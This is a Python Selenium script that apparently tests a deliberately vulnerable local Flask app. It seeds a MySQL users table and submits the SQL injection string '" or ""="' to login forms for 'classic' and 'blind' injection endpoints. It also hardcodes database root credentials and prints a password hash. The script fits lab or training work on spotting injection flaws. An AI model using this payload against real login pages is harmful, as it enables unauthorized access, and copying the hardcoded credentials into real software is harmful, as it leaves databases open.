from selenium.webdriver import Firefox
from selenium.webdriver.firefox.options import Options
from werkzeug.security import generate_password_hash, check_password_hash
import mysql.connector

def get_hash(password):
    return generate_password_hash(password)

def check_password(pw_hash, password):
    return check_password_hash(pw_hash, password)
    
def getMysqlConnection():
    return mysql.connector.connect(user='root', host='172.17.0.1', port='33060', password='test123', database='mydb')

def initDB():
    connection = getMysqlConnection()
    cursor = connection.cursor()
    sql = "INSERT INTO `tmpUser` (`username`, `password`) VALUES (%s, %s)"
    pw_hash = get_hash('test')
    cursor.execute(sql, ('test123', pw_hash))
    cursor.execute(sql, ('admin', pw_hash))
    cursor.execute(sql, ('nick', pw_hash))
    cursor.execute(sql, ('drew', pw_hash))
    connection.commit()
    print("DB Added Users:test123, admin, nick, drew " + "password:" + pw_hash)
    cursor.close()
    connection.close()

def classic():
    options = Options() # get firefox webdriver options
    options.add_argument('-headless') # run tests in headless mode CMD
    firefox = Firefox(firefox_options=options) # intialize firefox web driver
    firefox.get('http://localhost:5000/sql_classic') # test against flask app
    user = firefox.find_element_by_name('username')
    user.send_keys('" or ""="')
    password = firefox.find_element_by_name('password')
    password.send_keys('" or ""="')
    loginbtn = firefox.find_element_by_id('Login')
    loginbtn.click()
    if "test123" in firefox.page_source:
        print("Success Caught: Valid SQL Injection!")
    firefox.close()

def blind():
    options = Options() # get firefox webdriver options
    options.add_argument('-headless') # run tests in headless mode CMD
    firefox = Firefox(firefox_options=options) # intialize firefox web driver
    firefox.get('http://localhost:5000/sql_blind') # test against flask app
    user = firefox.find_element_by_name('username')
    user.send_keys('" or ""="')
    password = firefox.find_element_by_name('password')
    password.send_keys('" or ""="')
    loginbtn = firefox.find_element_by_id('Login')
    loginbtn.click()
    if "test123" in firefox.page_source:
        print("Success Caught: Valid User Login!")
    firefox.get('http://localhost:5000/sql_blind') # test against flask app
    user = firefox.find_element_by_name('username')
    user.send_keys('" or ""="')
    password = firefox.find_element_by_name('password')
    password.send_keys('" or ""="')
    loginbtn = firefox.find_element_by_id('Login')
    loginbtn.click()
    if "Login" in firefox.page_source:
        print("Success Caught: SQL blind")
    firefox.close()

def main():
    classic()
    blind()

if __name__ == "__main__":
    main()